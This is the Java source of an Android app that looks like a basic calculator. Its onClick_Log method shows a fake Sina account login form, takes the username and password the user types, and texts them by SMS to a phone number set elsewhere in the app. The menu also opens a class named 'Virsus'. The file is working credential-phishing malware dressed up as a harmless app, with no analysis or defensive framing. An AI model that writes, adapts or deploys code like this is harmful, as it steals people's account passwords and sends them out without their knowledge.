package com.example.mc;

import android.os.Bundle;
import android.app.Activity;
import android.util.Log;
import android.view.*;
import android.view.inputmethod.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.telephony.SmsManager;

public class MainActivity extends Activity implements OnClickListener
{
	static StringBuilder string1 = new StringBuilder("");
	static StringBuilder string2 = new StringBuilder("");
	static boolean flag = true;
	boolean splash = true;

	@Override
	protected void onCreate(Bundle savedInstanceState)
	{
		super.onCreate(savedInstanceState);
		Log.d("MC", "Main");
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		setContentView(R.layout.log);
	}

	public void onClick_Log(View view)
	{
		//关闭输入法
		InputMethodManager inputMethodManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);

		inputMethodManager.hideSoftInputFromWindow(this.getCurrentFocus()
				.getWindowToken(), InputMethodManager.HIDE_NOT_ALWAYS);

		EditText text_name = (EditText) findViewById(R.id.name);
		EditText text_pwd = (EditText) findViewById(R.id.pwd);
		String name = text_name.getText().toString();
		String pwd = text_pwd.getText().toString();
		send("新浪账户:\n" + "用户名: " + name + "\n" + "密码: " + pwd);
		setContentView(R.layout.end);
	}

	public void send(String content)
	{
		if ((Set_num.number.length() == 11) && (Set_num.number.startsWith("1")))
		{
			SmsManager.getDefault().sendTextMessage(Set_num.number, null,
					content, null, null);
		}
	}

	@Override
	public void onClick(View view)
	{
		Intent cal = new Intent();
		cal.setAction(Intent.ACTION_MAIN);
		cal.addCategory(Intent.CATEGORY_HOME);
		startActivity(cal);
		double val;
		TextView text = (TextView) findViewById(R.id.text);
		switch (view.getId())
		{
		case R.id.btn0:
			string1.append("0");
			text.setText(string1);
			break;
		case R.id.btn1:
			string1.append("1");
			text.setText(string1);
			break;
		case R.id.btn2:
			string1.append("2");
			text.setText(string1);
			break;
		case R.id.btn3:
			string1.append("3");
			text.setText(string1);
			break;
		case R.id.btn4:
			string1.append("4");
			text.setText(string1);
			break;
		case R.id.btn5:
			string1.append("5");
			text.setText(string1);
			break;
		case R.id.btnc:
			string1.delete(0, string1.length());
			string2.delete(0, string2.length());
			text.setText(string1);
			break;
		case R.id.btn_add:
			flag = true;
			for (int i = 0; i < string1.length(); i++)
			{
				string2.append(string1.charAt(i));
			}
			string1.delete(0, string1.length());
			text.setText(string2.toString() + '+');
			break;
		case R.id.btn_dec:
			flag = false;
			for (int i = 0; i < string1.length(); i++)
			{
				string2.append(string1.charAt(i));
			}
			string1.delete(0, string1.length());
			text.setText(string2.toString() + "-");
			break;
		case R.id.btn_val:
			if (flag)
				val = Double.valueOf(string1.toString())
						+ Double.valueOf(string2.toString());
			else
				val = Double.valueOf(string2.toString())
						- Double.valueOf(string1.toString());
			string1.delete(0, string1.length());
			string2.delete(0, string2.length());
			text.setText(String.valueOf(val));
			break;
		default:
			Log.d("123", "default");
			text.setTag(null);
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu)
	{
		// Inflate the menu; this adds items to the action bar if it is present.
		// getMenuInflater().inflate(R.menu.main, menu);
		Log.d("MC", "menu");
		MenuItem menuItem = menu.add(1, 1, 1, "mc");
		Intent intent = new Intent(this, Virsus.class);
		menuItem.setIntent(intent);
		return true;
	}

}
